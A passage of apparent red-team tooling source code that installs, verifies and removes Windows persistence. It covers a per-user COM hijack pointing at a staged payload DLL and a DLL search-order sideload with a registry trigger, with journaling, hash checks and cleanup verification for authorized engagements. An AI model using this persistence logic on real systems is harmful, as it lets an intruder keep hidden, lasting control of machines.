      ev.note = 'location already holds a FOREIGN value (sha256 ' + sha256(String(pre.value)).slice(0, 12) + '…) — REFUSED to clobber it silently. Re-task with overwrite:true to journal the old value and replace it; the journal restores it on remove.';
      return ev;
    }
    if (pre.present && overwrite) ev.overwriteJournaled = true;
    try { this.backend.apply(ev.location, this.target); } catch (e) {
      ev.error = 'install write failed: ' + ((e && e.message) || e) + ' — nothing claimed';
      return ev;
    }
    let post;
    try { post = this.backend.probe(ev.location); } catch (e) {
      ev.state = 'failed'; ev.error = 'post-install re-read failed: ' + ((e && e.message) || e) + ' — the write is UNVERIFIED, reported honestly';
      return ev;
    }
    ev.installVerified = !!(post && post.present === true && post.value === this.target);
    if (!ev.installVerified) {
      ev.state = 'failed';
      ev.error = 'install write did NOT verify (re-read mismatch — the location does not hold the target line). Nothing claimed; remove will still take this entry back.';
    } else {
      ev.state = 'installed';
    }
    this._recordEntry(technique, ev, {
      present: pre.present === true,
      value: ev.overwriteJournaled ? String(pre.value) : null, // the journal: restore-on-remove source
      valueSha256: pre.present ? sha256(String(pre.value)) : null,
    }, ev.overwriteJournaled);
    return ev;
  }

  _recordEntry(technique, ev, preInstall, overwriteJournaled) {
    const prev = this.manifest.entries[technique];
    this.manifest.entries[technique] = {
      technique, location: ev.location, targetSha256: ev.targetSha256,
      preInstall: preInstall.present ? preInstall : { present: false, value: null, valueSha256: null },
      overwriteJournaled: overwriteJournaled === true,
      // honest state: an install whose write did NOT verify is recorded as 'failed'
      // (the entry exists so remove can still take it back — the sweep re-probes live).
      state: ev.state === 'installed' ? 'installed' : 'failed',
      installedAt: (prev && prev.installedAt) || this._now(),
      removedAt: null, removalVerified: null,
    };
  }

  // The deep twin of _recordEntry: same shape PLUS the parameter journal (deep) — the
  // manifest is the source of truth for what was installed, so a later process (an
  // agent relaunched BY the persistence itself) can still remove-verifiably exactly
  // what a previous incarnation planted.
  _recordDeepEntry(ev, deep, preInstall, overwriteJournaled) {
    const key = deepEntryKey(ev.technique, deep);
    ev.entryKey = key;
    const prev = this.manifest.entries[key];
    this.manifest.entries[key] = {
      technique: ev.technique, location: ev.location, targetSha256: ev.targetSha256,
      deep,
      preInstall: preInstall.present ? preInstall : { present: false, value: null, valueSha256: null },
      overwriteJournaled: overwriteJournaled === true,
      state: ev.state === 'installed' ? 'installed' : 'failed',
      installedAt: (prev && prev.installedAt) || this._now(),
      removedAt: null, removalVerified: null,
    };
  }

  _needFiles(ev) {
    if (typeof this.backend.probeFile !== 'function' || typeof this.backend.plantFile !== 'function' || typeof this.backend.removeFile !== 'function') {
      ev.error = 'the injected backend lacks the file legs (probeFile/plantFile/removeFile) — deep persistence NEVER touches the real filesystem from Node; nothing written';
      return true;
    }
    return false;
  }

  // ——— comhijack: the user-context COM hijack ———
  _installComHijack(deep, { overwrite }) {
    const ev = this._evidence('comhijack', deep);
    const loc = ev.location;
    if (typeof this.backend.probeFile !== 'function') {
      ev.error = 'the injected backend lacks probeFile — the payload DLL cannot be evidenced (no payload, no write)';
      return ev;
    }
    // 1. CLASSIFY THE CANDIDATE (shadow-vs-safe) from live hive facts when the backend
    //    probes them; the classification rides the evidence + the journal either way.
    let facts = null;
    if (typeof this.backend.probeClsid === 'function') {
      try { facts = this.backend.probeClsid(deep.clsid); } catch (e) {
        ev.error = 'candidate classification probe failed: ' + ((e && e.message) || e) + ' — nothing written (cleanup doctrine: no snapshot, no write)';
        return ev;
      }
    }
    const cls = classifyComCandidate({ clsid: deep.clsid, hklm: facts ? facts.hklm : null, hkcu: facts ? facts.hkcu : null, ourValue: deep.dll });
    ev.classification = cls.classification; ev.shadow = cls.shadow === true;
    // 2. THE PAYLOAD must exist and hash — the hijack points at a staged artifact and
    //    the audit pins its bytes. No payload, no write.
    let dllProbe;
    try { dllProbe = this.backend.probeFile(deep.dll); } catch (e) {
      ev.error = 'payload probe failed: ' + ((e && e.message) || e) + ' — nothing written';
      return ev;
    }
    if (!dllProbe || dllProbe.present !== true || !dllProbe.sha256) {
      ev.error = 'payload DLL not found or unhashable at ' + deep.dll + ' — stage it into the governed sandbox first (nothing written)';
      return ev;
    }
    ev.dllSha256 = dllProbe.sha256;
    // 3. pre-install snapshot FIRST — the identical clobber doctrine as the classic tier.
    let pre;
    try { pre = this.backend.probe(loc); } catch (e) {
      ev.error = 'pre-install probe failed: ' + ((e && e.message) || e) + ' — nothing written (cleanup doctrine: no snapshot, no write)';
      return ev;
    }
    pre = pre || { present: false, value: null };
    ev.preExisted = pre.present === true;
    const journalDeep = () => ({ technique: 'comhijack', clsid: deep.clsid, dll: deep.dll, dllSha256: ev.dllSha256, classification: ev.classification, shadow: ev.shadow });
    if (pre.present && pre.value === ev.target) {
      ev.state = 'installed'; ev.installVerified = true;
      ev.note = 'already installed and intact (the InprocServer32 re-read matches the payload path) — idempotent no-op. ' + cls.note;
      this._recordDeepEntry(ev, journalDeep(), { present: true, value: null, valueSha256: null }, false);
      return ev;
    }
    if (pre.present && !overwrite) {
      ev.state = 'refused-clobber';
      ev.note = 'the InprocServer32 already holds a FOREIGN value (sha256 ' + sha256(String(pre.value)).slice(0, 12) + '…) — REFUSED to clobber it silently. Re-task with overwrite:true to journal the old value and replace it; the journal restores it on remove.';
      return ev;
    }
    if (pre.present && overwrite) ev.overwriteJournaled = true;
    try { this.backend.apply(loc, ev.target); } catch (e) {
      ev.error = 'hijack write failed: ' + ((e && e.message) || e) + ' — nothing claimed';
      return ev;
    }
    let post;
    try { post = this.backend.probe(loc); } catch (e) {
      ev.state = 'failed'; ev.error = 'post-install re-read failed: ' + ((e && e.message) || e) + ' — the write is UNVERIFIED, reported honestly';
      return ev;
    }
    ev.installVerified = !!(post && post.present === true && post.value === ev.target);
    if (!ev.installVerified) {
      ev.state = 'failed';
      ev.error = 'hijack write did NOT verify (re-read mismatch — the InprocServer32 does not hold the payload path). Nothing claimed; remove will still take this entry back.';
    } else {
      ev.state = 'installed';
      ev.note = (ev.shadow ? 'SHADOW install: ' : 'safe-abandoned install: ') + cls.impact;
    }
    this._recordDeepEntry(ev, journalDeep(), {
      present: pre.present === true,
      value: ev.overwriteJournaled ? String(pre.value) : null,
      valueSha256: pre.present ? sha256(String(pre.value)) : null,
    }, ev.overwriteJournaled);
    return ev;
  }

  // ——— dllsearch: execproxy-sideload plant + a classic persist trigger ———
  _installDllSearch(deep, { overwrite }) {
    const ev = this._evidence('dllsearch', deep);
    const plan = dllSearchPlan({ ...deep, tag: this.tag, sandbox: this.sandbox });
    if (this._needFiles(ev)) return ev;
    // 1. PAYLOAD + HOST must exist and hash — the audit pins every executed byte.
    let dllProbe;
    try { dllProbe = this.backend.probeFile(deep.dll); } catch (e) {
      ev.error = 'payload probe failed: ' + ((e && e.message) || e) + ' — nothing planted, nothing armed';
      return ev;
    }
    if (!dllProbe || dllProbe.present !== true || !dllProbe.sha256) {
      ev.error = 'payload DLL not found or unhashable at ' + deep.dll + ' — stage it into the governed sandbox first (nothing planted, nothing armed)';
      return ev;
    }
    ev.dllSha256 = dllProbe.sha256;
    let hostProbe;
    try { hostProbe = this.backend.probeFile(deep.host); } catch (e) {
      ev.error = 'signed-host probe failed: ' + ((e && e.message) || e) + ' — nothing planted, nothing armed';
      return ev;
    }
    if (!hostProbe || hostProbe.present !== true || !hostProbe.sha256) {
      ev.error = 'sideload host not found or unhashable at ' + deep.host + ' — discovery (tools/execproxy.mjs) ranks candidates; nothing planted, nothing armed';
      return ev;
    }
    ev.hostSha256 = hostProbe.sha256;
    // 2. THE PLANT (execproxy discipline verbatim): pre-snapshot each target; a FOREIGN
    //    occupant is a loud refusal — files are never journaled/overwritten; plants are
    //    proven by sha256 re-read.
    for (const f of plan.files) {
      if (!f.copyFrom) continue;
      const rec = { role: f.role, path: f.path, sha256: null, present: false, planted: false, preExisted: false, removalVerified: null };
      let preF;
      try { preF = this.backend.probeFile(f.path); } catch (e) {
        ev.error = 'pre-plant probe failed for ' + f.path + ': ' + ((e && e.message) || e) + ' — nothing claimed';
        ev.files.push(rec);
        this._recordDeepEntry(ev, this._dllSearchJournal(deep, ev, plan), { present: false, value: null, valueSha256: null }, false);
        return ev;
      }
      preF = preF || { present: false, sha256: null };
      rec.preExisted = preF.present === true;
      const want = f.role === 'host-copy' ? ev.hostSha256 : ev.dllSha256;
      if (preF.present) {
        if (preF.sha256 !== want) {
          ev.state = 'refused-clobber';
          rec.present = true; rec.sha256 = preF.sha256;
          ev.files.push(rec);
          ev.error = 'plant target already holds FOREIGN bytes (sha256 ' + String(preF.sha256).slice(0, 12) + '…): ' + f.path + ' — REFUSED to clobber it silently (files are never journaled). persist-remove this name first, or pick another name handle.';
          this._recordDeepEntry(ev, this._dllSearchJournal(deep, ev, plan), { present: false, value: null, valueSha256: null }, false);
          return ev;
        }
        rec.present = true; rec.sha256 = preF.sha256; rec.planted = true; // idempotent: ours, intact
        ev.files.push(rec);
        continue;
      }
      try { this.backend.plantFile(f.path, f.copyFrom); } catch (e) {
        ev.error = 'plant write failed for ' + f.path + ': ' + ((e && e.message) || e) + ' — nothing claimed';
        ev.files.push(rec);
        this._recordDeepEntry(ev, this._dllSearchJournal(deep, ev, plan), { present: false, value: null, valueSha256: null }, false);
        return ev;
      }
      let postF;
      try { postF = this.backend.probeFile(f.path); } catch (e) {
        ev.error = 'post-plant re-read failed for ' + f.path + ': ' + ((e && e.message) || e) + ' — the plant is UNVERIFIED, reported honestly; remove will still take this entry back';
        ev.files.push(rec);
        this._recordDeepEntry(ev, this._dllSearchJournal(deep, ev, plan), { present: false, value: null, valueSha256: null }, false);
        return ev;
      }
      if (!postF || postF.present !== true || postF.sha256 !== want) {
        ev.error = 'plant write did NOT verify (sha256 re-read mismatch) for ' + f.path + ' — the plant is UNVERIFIED, reported honestly; remove will still take this entry back';
        rec.present = !!(postF && postF.present); rec.sha256 = postF ? postF.sha256 : null;
        ev.files.push(rec);
        this._recordDeepEntry(ev, this._dllSearchJournal(deep, ev, plan), { present: false, value: null, valueSha256: null }, false);
        return ev;
      }
      rec.present = true; rec.sha256 = postF.sha256; rec.planted = true;
      ev.files.push(rec);
    }
    // 3. THE TRIGGER — armed LAST (only once every plant verifies), with the classic
    //    registry discipline: snapshot, refuse/journal a foreign value, prove by re-read.
    const trigLoc = plan.trigger.location;
    let pre;
    try { pre = this.backend.probe(trigLoc); } catch (e) {
      ev.error = 'trigger pre-install probe failed: ' + ((e && e.message) || e) + ' — the plants are journaled; the trigger was NOT armed';
      this._recordDeepEntry(ev, this._dllSearchJournal(deep, ev, plan), { present: false, value: null, valueSha256: null }, false);
      return ev;
    }
    pre = pre || { present: false, value: null };
    ev.preExisted = pre.present === true;
    if (pre.present && pre.value === plan.trigger.value) {
      ev.state = 'installed'; ev.installVerified = true;
      ev.note = 'already installed and intact (plants hash-verified; the trigger re-read matches the copied-host line) — idempotent no-op';
      this._recordDeepEntry(ev, this._dllSearchJournal(deep, ev, plan), { present: true, value: null, valueSha256: null }, false);
      return ev;
    }
    if (pre.present && !overwrite) {
      ev.state = 'refused-clobber';
      ev.note = 'the trigger location already holds a FOREIGN value (sha256 ' + sha256(String(pre.value)).slice(0, 12) + '…) — REFUSED to clobber it silently. The plant files are journaled and remove takes them back; re-task with overwrite:true to journal the old trigger value and replace it.';
      this._recordDeepEntry(ev, this._dllSearchJournal(deep, ev, plan), { present: false, value: null, valueSha256: null }, false);
      return ev;
    }
    if (pre.present && overwrite) ev.overwriteJournaled = true;
    try { this.backend.apply(trigLoc, plan.trigger.value); } catch (e) {
      ev.error = 'trigger write failed: ' + ((e && e.message) || e) + ' — the plants are journaled; nothing claimed';
      this._recordDeepEntry(ev, this._dllSearchJournal(deep, ev, plan), { present: pre.present === true, value: ev.overwriteJournaled ? String(pre.value) : null, valueSha256: pre.present ? sha256(String(pre.value)) : null }, ev.overwriteJournaled);
      return ev;
    }
    let post;
    try { post = this.backend.probe(trigLoc); } catch (e) {
      ev.state = 'failed'; ev.error = 'trigger post-install re-read failed: ' + ((e && e.message) || e) + ' — the write is UNVERIFIED, reported honestly';
      this._recordDeepEntry(ev, this._dllSearchJournal(deep, ev, plan), { present: pre.present === true, value: ev.overwriteJournaled ? String(pre.value) : null, valueSha256: pre.present ? sha256(String(pre.value)) : null }, ev.overwriteJournaled);
      return ev;
    }
    const triggerVerified = !!(post && post.present === true && post.value === plan.trigger.value);
    ev.installVerified = triggerVerified && ev.files.every((f) => f.planted);
    if (!ev.installVerified) {
      ev.state = 'failed';
      ev.error = 'the dllsearch install did NOT fully verify (trigger re-read or a plant mismatch) — nothing claimed; remove will still take this entry back.';
    } else {
      ev.state = 'installed';
      ev.note = 'plants sha256-verified in the governed dir and the ' + plan.trigger.technique + ' trigger re-read-verified pointing at the COPY — whether the copied host search-order-loads the planted name on this build is MEASURED per engagement (execproxy marker/edrview), never claimed';
    }
    this._recordDeepEntry(ev, this._dllSearchJournal(deep, ev, plan), {
      present: pre.present === true,
      value: ev.overwriteJournaled ? String(pre.value) : null,
      valueSha256: pre.present ? sha256(String(pre.value)) : null,
    }, ev.overwriteJournaled);
    return ev;
  }

  _dllSearchJournal(deep, ev, plan) {
    return {
      technique: 'dllsearch', host: deep.host, hostSha256: ev.hostSha256, as: deep.as, dll: deep.dll, dllSha256: ev.dllSha256,
      plantDir: plan.plantDir,
      trigger: { technique: plan.trigger.technique, location: plan.trigger.location, value: plan.trigger.value, targetSha256: sha256(plan.trigger.value) },
      files: ev.files.map((f) => ({ role: f.role, path: f.path, sha256: f.sha256, planted: f.planted === true })),
    };
  }

  // status(): LIVE re-read, measured now — never remembered. States: 'installed'
  // (present + intact), 'tampered' (present but the value changed under us), 'removed'
  // (verified absent after a remove op), 'missing' (manifest says installed but the
  // location is gone — removed out-of-band, an honest loose end), 'foreign-present'
  // (something else owns the location — never claimed), 'absent'.
  status(technique, { deep = null, prove = false } = {}) {
    if (!PERSIST_ALL_TECHNIQUES.includes(technique)) throw new TypeError('persist-status: unknown technique ' + JSON.stringify(technique));
    if (PERSIST_DEEP_TECHNIQUES.includes(technique)) return this._statusDeep(technique, this._deepFor(technique, deep), { prove });
    const ev = this._evidence(technique);
    const entry = this.manifest.entries[technique];
    let cur;
    try { cur = this.backend.probe(ev.location); } catch (e) {
      ev.error = 'status probe failed: ' + ((e && e.message) || e);
      return ev;
    }
    cur = cur || { present: false, value: null };
    ev.preExisted = entry ? entry.preInstall.present === true : false;
    if (cur.present && cur.value === this.target) {
      ev.state = 'installed'; ev.installVerified = true;
      ev.note = entry ? 'present and intact (live re-read matches the target line)' : 'present and intact (value-identified as ours; no manifest entry)';
    } else if (cur.present) {
      ev.state = entry && entry.state === 'installed' ? 'tampered' : 'foreign-present';
      ev.note = ev.state === 'tampered'
        ? 'the location holds a DIFFERENT value than this agent installed (sha256 ' + sha256(String(cur.value)).slice(0, 12) + '…) — changed since install; reporting honestly'
        : 'the location holds a value this agent never installed — not ours, never claimed';
    } else if (entry && entry.removalVerified === true) {
      ev.state = 'removed'; ev.removalVerified = true;
      ev.note = 'verified absent (removal was proven at ' + (entry.removedAt || 'remove time') + '; still absent at this live re-read)';
    } else if (entry && entry.state === 'installed') {
      ev.state = 'missing';
      ev.note = 'manifest says installed but the location is GONE — removed outside a verified remove op (out-of-band). Absence is measured now; the removal itself was never channel-verified.';
    } else {
      ev.state = 'absent';
      ev.note = 'not installed (no manifest entry, location clean at live re-read)';
    }
    return ev;
  }

  // Deep status: the same LIVE re-read discipline against the deep location set, PLUS
  // the trigger-model statement (always) and — for comhijack with prove:true — the
  // resolve-proof slot (filled AGENT-SIDE by the PS twin; the pure store never spawns
  // processes, so it reports the proof as delegated, honestly).
  _statusDeep(technique, deep, { prove = false } = {}) {
    if (!deep) {
      const ev0 = { state: 'absent', technique, location: null, target: null, targetSha256: null, preExisted: false, overwriteJournaled: false, installVerified: null, removalVerified: null, journalRestored: null, triggerModel: PERSIST_TRIGGER_MODELS[technique], note: 'no manifest entry and no deep params supplied — a deep location is parameter-derived (a CLSID / a governed plant dir), so there is nothing to re-read; NOT claimed present, never assumed removed-out-of-band', error: null };
      return ev0;
    }
    const ev = this._evidence(technique, deep);
    const entry = this._entryFor(technique, deep);
    if (technique === 'comhijack') {
      ev.classification = (entry && entry.deep && entry.deep.classification) || null;
      ev.shadow = !!(entry && entry.deep && entry.deep.shadow);
      ev.dllSha256 = (entry && entry.deep && entry.deep.dllSha256) || null;
      if (prove) ev.resolveProof = null; // the PS twin fills this — see Invoke-VvPersistOp
      let cur;
      try { cur = this.backend.probe(ev.location); } catch (e) {
        ev.error = 'status probe failed: ' + ((e && e.message) || e);
        return ev;
      }
      cur = cur || { present: false, value: null };
      ev.preExisted = entry ? entry.preInstall.present === true : false;
      if (cur.present && cur.value === ev.target) {
        ev.state = 'installed'; ev.installVerified = true;
        ev.note = (entry ? 'hijack present and intact (the InprocServer32 re-read matches the payload path)' : 'hijack present and intact (value-identified as ours; no manifest entry)') + (ev.shadow ? ' — SHADOW: this hijack shadows an HKLM registration (higher impact, flagged at install)' : '');
      } else if (cur.present) {
        ev.state = entry && entry.state === 'installed' ? 'tampered' : 'foreign-present';
        ev.note = ev.state === 'tampered'
          ? 'the InprocServer32 holds a DIFFERENT value than this agent installed (sha256 ' + sha256(String(cur.value)).slice(0, 12) + '…) — changed since install; reporting honestly'
          : 'the InprocServer32 holds a value this agent never installed — not ours, never claimed';
      } else if (entry && entry.removalVerified === true) {
        ev.state = 'removed'; ev.removalVerified = true;
        ev.note = 'verified absent (removal was proven at ' + (entry.removedAt || 'remove time') + '; still absent at this live re-read — the CLSID resolves exactly as it did pre-install)';
      } else if (entry && entry.state === 'installed') {
        ev.state = 'missing';
        ev.note = 'manifest says installed but the hijack is GONE — removed outside a verified remove op (out-of-band). Absence is measured now; the removal itself was never channel-verified.';
      } else {
        ev.state = 'absent';
        ev.note = 'not installed (no manifest entry, the InprocServer32 is clean at live re-read)';
      }
      return ev;
    }
    // dllsearch: trigger re-read + per-file hash re-read. 'installed' only when the
    // trigger matches AND every planted file hashes to what we planted.
    const plan = dllSearchPlan({ ...deep, tag: this.tag, sandbox: this.sandbox });
    const recorded = (entry && entry.deep && Array.isArray(entry.deep.files) && entry.deep.files.length)
      ? entry.deep.files
      : plan.files.filter((f) => f.copyFrom).map((f) => ({ role: f.role, path: f.path, sha256: f.role === 'host-copy' ? (entry && entry.deep && entry.deep.hostSha256) || null : (entry && entry.deep && entry.deep.dllSha256) || null, planted: true }));
    let trig;
    try { trig = this.backend.probe(plan.trigger.location); } catch (e) {
      ev.error = 'trigger probe failed: ' + ((e && e.message) || e);
      return ev;
    }
    trig = trig || { present: false, value: null };
    ev.dllSha256 = (entry && entry.deep && entry.deep.dllSha256) || null;
    ev.hostSha256 = (entry && entry.deep && entry.deep.hostSha256) || null;
    let anyPresent = trig.present === true;
    let anyTampered = trig.present === true && trig.value !== plan.trigger.value;
    let anyUnverifiable = false;
    for (const f of recorded) {
      const rec = { role: f.role, path: f.path, sha256: null, present: false, planted: f.planted === true, removalVerified: null, state: null };
      let cur;
      try { cur = this.backend.probeFile(f.path); } catch { cur = null; }
      if (cur === null || cur === undefined) { rec.state = 'unknown'; anyUnverifiable = true; ev.files.push(rec); continue; }
      rec.present = cur.present === true; rec.sha256 = cur.sha256 || null;
      if (rec.present) {
        anyPresent = true;
        if (f.sha256 && cur.sha256 === f.sha256) rec.state = 'planted';
        else { rec.state = 'tampered'; anyTampered = true; }
      } else {
        rec.state = entry && entry.removalVerified === true ? 'removed' : 'absent';
        if (rec.state === 'removed') rec.removalVerified = true;
      }
      ev.files.push(rec);
    }
    ev.preExisted = entry ? entry.preInstall.present === true : false;
    if (anyTampered) {
      ev.state = entry && entry.state === 'installed' ? 'tampered' : 'foreign-present';
      ev.note = 'a dllsearch artifact CHANGED under us (trigger value or a planted file hash) — reported honestly; removal refuses to delete foreign bytes';
    } else if (anyPresent) {
      ev.state = 'installed'; ev.installVerified = true;
      ev.note = 'trigger and plant files present and intact at live re-read (trigger line matches the copied host; every planted file hash-matches)';
    } else if (anyUnverifiable) {
      ev.state = 'unknown';
      ev.note = 'a probe failed — never assume absence';
    } else if (entry && entry.removalVerified === true) {
      ev.state = 'removed'; ev.removalVerified = true;
      ev.note = 'verified absent (removal was proven at ' + (entry.removedAt || 'remove time') + '; trigger and every plant still absent at this live re-read)';
    } else if (entry && entry.state === 'installed') {
      ev.state = 'missing';
      ev.note = 'manifest says installed but the artifacts are GONE — removed outside a verified remove op (out-of-band). Absence is measured now; the removal itself was never channel-verified.';
    } else {
      ev.state = 'absent';
      ev.note = 'not installed (no manifest entry; trigger location and plant paths clean at live re-read)';
    }
    return ev;
  }

  // remove(): execute, then VERIFY. A journaled pre-install value is RESTORED (not
  // deleted). A removal whose re-read still shows the location present is
  // 'removal-failed' — LOUD, kept in the manifest as an open loose end, escalated by
  // the channel intake ('persist.remove-failed'). A foreign value this agent never
  // installed is REFUSED (we never delete what we did not write).
  remove(technique, { deep = null } = {}) {
    if (!PERSIST_ALL_TECHNIQUES.includes(technique)) throw new TypeError('persist-remove: unknown technique ' + JSON.stringify(technique));
    if (PERSIST_DEEP_TECHNIQUES.includes(technique)) return this._removeDeep(technique, this._deepFor(technique, deep));
    const ev = this._evidence(technique);
    const entry = this.manifest.entries[technique];
    if (entry) ev.preExisted = entry.preInstall.present === true;
    if (entry && entry.overwriteJournaled && entry.preInstall.value != null) {
      ev.overwriteJournaled = true;
      let post;
      try {
        this.backend.apply(ev.location, entry.preInstall.value);
        post = this.backend.probe(ev.location);
      } catch (e) {
        ev.state = 'removal-failed'; entry.state = 'removal-failed'; entry.removalVerified = false;
        ev.error = 'journal restore failed: ' + ((e && e.message) || e) + ' — the pre-install value is NOT provably back (LOUD; escalate to the operator)';
        return ev;
      }
      ev.journalRestored = !!(post && post.present === true && post.value === entry.preInstall.value);
      ev.removalVerified = ev.journalRestored;
      if (!ev.journalRestored) {
        ev.state = 'removal-failed'; entry.state = 'removal-failed'; entry.removalVerified = false;
        ev.error = 'journal restore did NOT verify (re-read != the journaled pre-install value) — the location does NOT hold what it held before install (LOUD; escalate)';
        return ev;
      }
      ev.state = 'removed';
      ev.note = 'the journaled pre-install value was restored and re-verified — the location provably holds what it held before install';
      entry.state = 'removed'; entry.removalVerified = true; entry.removedAt = this._now();
      return ev;
    }
    let cur;
    try { cur = this.backend.probe(ev.location); } catch (e) {
      ev.state = 'removal-failed';
      if (entry) { entry.state = 'removal-failed'; entry.removalVerified = false; }
      ev.error = 'pre-remove probe failed: ' + ((e && e.message) || e) + ' — removal UNVERIFIED (LOUD; escalate)';
      return ev;
    }
    cur = cur || { present: false, value: null };
    if (cur.present) {
      const claimed = !!entry || cur.value === this.target;
      if (!claimed) {
        ev.state = 'refused-foreign';
        ev.note = 'the location holds a value this agent NEVER installed (no manifest entry, value mismatch) — REFUSED to remove what we did not write';
        return ev;
      }
      let post;
      try {
        this.backend.remove(ev.location);
        post = this.backend.probe(ev.location);
      } catch (e) {
        ev.state = 'removal-failed';
        if (entry) { entry.state = 'removal-failed'; entry.removalVerified = false; }
        ev.error = 'remove/re-read failed: ' + ((e && e.message) || e) + ' — removal UNVERIFIED (LOUD; escalate)';
        return ev;
      }
      ev.removalVerified = !!(post && post.present === false);
      if (!ev.removalVerified) {
        ev.state = 'removal-failed';
        if (entry) { entry.state = 'removal-failed'; entry.removalVerified = false; }
        ev.error = 'remove executed but the location is STILL PRESENT on re-read — CLEANUP-PROOF FAILED (loud, escalated to the operator; the engagement cannot be called clean)';
        return ev;
      }
      ev.state = 'removed';
      if (entry) { entry.state = 'removed'; entry.removalVerified = true; entry.removedAt = this._now(); }
      else ev.note = 'no manifest entry (value-identified as ours) — removed and verified absent';
      return ev;
    }
    ev.state = 'removed'; ev.removalVerified = true;
    ev.note = entry ? 'already absent at remove time — absence re-verified now' : 'nothing installed (no manifest entry) — the location is verified clean';
    if (entry) { entry.state = 'removed'; entry.removalVerified = true; entry.removedAt = this._now(); }
    return ev;
  }

  // Deep removal: execute, then VERIFY — identical doctrine. comhijack is the classic
  // registry dance against the InprocServer32 value (a journaled foreign value is
  // RESTORED; a shadow install un-shadows by deletion — HKLM is never touched).
  // dllsearch disarms the TRIGGER FIRST (the persistence stops firing), then deletes
  // ONLY hash-matching plants (foreign bytes are a loud refused-foreign), then the
  // plant dir; removalVerified = trigger verified AND every planted file verified.
  _removeDeep(technique, deep) {
    if (!deep) {
      const entry0 = this.manifest.entries[technique];
      const ev0 = { state: 'removed', technique, location: null, target: null, targetSha256: null, preExisted: false, overwriteJournaled: false, installVerified: null, removalVerified: true, journalRestored: null, triggerModel: PERSIST_TRIGGER_MODELS[technique], note: entry0 ? 'manifest entry carries no deep params (a pre-deep manifest) — nothing locatable to remove; reported honestly' : 'nothing installed (no manifest entry, no params) — verified clean of anything this agent recorded', error: null };
      return ev0;
    }
    const ev = this._evidence(technique, deep);
    const entry = this._entryFor(technique, deep);
    if (technique === 'dllsearch') return this._removeDllSearch(ev, entry, deep);
    // ——— comhijack removal (the classic dance against the hijacked value) ———
    ev.classification = (entry && entry.deep && entry.deep.classification) || null;
    ev.shadow = !!(entry && entry.deep && entry.deep.shadow);
    ev.dllSha256 = (entry && entry.deep && entry.deep.dllSha256) || null;
    if (entry) ev.preExisted = entry.preInstall.present === true;
    if (entry && entry.overwriteJournaled && entry.preInstall.value != null) {
      ev.overwriteJournaled = true;
      let post;
      try {
        this.backend.apply(ev.location, entry.preInstall.value);
        post = this.backend.probe(ev.location);
      } catch (e) {
        ev.state = 'removal-failed'; entry.state = 'removal-failed'; entry.removalVerified = false;
        ev.error = 'journal restore failed: ' + ((e && e.message) || e) + ' — the pre-install value is NOT provably back (LOUD; escalate to the operator)';
        return ev;
      }
      ev.journalRestored = !!(post && post.present === true && post.value === entry.preInstall.value);
      ev.removalVerified = ev.journalRestored;
      if (!ev.journalRestored) {
        ev.state = 'removal-failed'; entry.state = 'removal-failed'; entry.removalVerified = false;
        ev.error = 'journal restore did NOT verify (re-read != the journaled pre-install value) — the InprocServer32 does NOT hold what it held before install (LOUD; escalate)';
        return ev;
      }
      ev.state = 'removed';
      ev.note = 'the journaled pre-install value was restored and re-verified — the InprocServer32 provably holds what it held before install';
      entry.state = 'removed'; entry.removalVerified = true; entry.removedAt = this._now();
      return ev;
    }
    let cur;
    try { cur = this.backend.probe(ev.location); } catch (e) {
      ev.state = 'removal-failed';
      if (entry) { entry.state = 'removal-failed'; entry.removalVerified = false; }
      ev.error = 'pre-remove probe failed: ' + ((e && e.message) || e) + ' — removal UNVERIFIED (LOUD; escalate)';
      return ev;
    }
    cur = cur || { present: false, value: null };
    if (cur.present) {
      const claimed = !!entry || cur.value === ev.target;
      if (!claimed) {
        ev.state = 'refused-foreign';
        ev.note = 'the InprocServer32 holds a value this agent NEVER installed (no manifest entry, value mismatch) — REFUSED to remove what we did not write';
        return ev;
      }
      let post;
      try {
        this.backend.remove(ev.location);
        post = this.backend.probe(ev.location);
      } catch (e) {
        ev.state = 'removal-failed';
        if (entry) { entry.state = 'removal-failed'; entry.removalVerified = false; }
        ev.error = 'remove/re-read failed: ' + ((e && e.message) || e) + ' — removal UNVERIFIED (LOUD; escalate)';
        return ev;
      }
      ev.removalVerified = !!(post && post.present === false);
      if (!ev.removalVerified) {
        ev.state = 'removal-failed';
        if (entry) { entry.state = 'removal-failed'; entry.removalVerified = false; }
        ev.error = 'remove executed but the hijack is STILL PRESENT on re-read — CLEANUP-PROOF FAILED (loud, escalated to the operator; the engagement cannot be called clean)';
        return ev;
      }
      ev.state = 'removed';
      ev.note = ev.shadow ? 'hijack deleted and verified absent — the HKLM registration is UN-SHADOWED (it was never touched); the class resolves machine-wide again' : 'hijack deleted and verified absent — the per-user registration is gone; the CLSID resolves exactly as it did pre-install';
      if (entry) { entry.state = 'removed'; entry.removalVerified = true; entry.removedAt = this._now(); }
      else ev.note = 'no manifest entry (value-identified as ours) — removed and verified absent';
      return ev;
    }
    ev.state = 'removed'; ev.removalVerified = true;
    ev.note = entry ? 'already absent at remove time — absence re-verified now' : 'nothing installed (no manifest entry) — the location is verified clean';
    if (entry) { entry.state = 'removed'; entry.removalVerified = true; entry.removedAt = this._now(); }
    return ev;
  }

  _removeDllSearch(ev, entry, deep) {
    if (this._needFiles(ev)) { ev.state = 'removal-failed'; ev.removalVerified = false; return ev; }
    const plan = dllSearchPlan({ ...deep, tag: this.tag, sandbox: this.sandbox });
    ev.dllSha256 = (entry && entry.deep && entry.deep.dllSha256) || null;
    ev.hostSha256 = (entry && entry.deep && entry.deep.hostSha256) || null;
    if (entry) ev.preExisted = entry.preInstall.present === true;
    // 1. DISARM THE TRIGGER FIRST — a journaled foreign trigger value is RESTORED; ours
    //    is deleted; either way verified by re-read before any file moves.
    if (entry && entry.overwriteJournaled && entry.preInstall.value != null) {
      ev.overwriteJournaled = true;
      let post;
      try {
        this.backend.apply(plan.trigger.location, entry.preInstall.value);
        post = this.backend.probe(plan.trigger.location);
      } catch (e) {
        ev.state = 'removal-failed'; entry.state = 'removal-failed'; entry.removalVerified = false;
        ev.error = 'trigger journal restore failed: ' + ((e && e.message) || e) + ' — the pre-install trigger value is NOT provably back (LOUD; escalate)';
        return ev;
      }
      ev.journalRestored = !!(post && post.present === true && post.value === entry.preInstall.value);
      if (!ev.journalRestored) {
        ev.state = 'removal-failed'; entry.state = 'removal-failed'; entry.removalVerified = false;
        ev.error = 'trigger journal restore did NOT verify — the trigger location does NOT hold what it held before install (LOUD; escalate)';
        return ev;
      }
      ev.removalVerified = null; // files still outstanding — see below
    } else {
      let cur;
      try { cur = this.backend.probe(plan.trigger.location); } catch (e) {
        ev.state = 'removal-failed';
        if (entry) { entry.state = 'removal-failed'; entry.removalVerified = false; }
